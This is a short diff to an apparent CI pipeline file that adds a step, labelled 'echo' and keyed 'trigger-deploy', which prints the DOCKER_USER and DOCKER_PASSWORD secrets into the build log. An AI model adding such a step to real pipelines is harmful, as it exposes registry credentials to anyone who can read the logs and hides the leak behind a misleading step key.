@@ -11,3 +11,6 @@ steps:
     plugins:
       - shellcheck#v1.2.0:
           files: hooks/**
+  - command: echo "$$DOCKER_USER $$DOCKER_PASSWORD"
+    label: "echo"
+    key: trigger-deploy
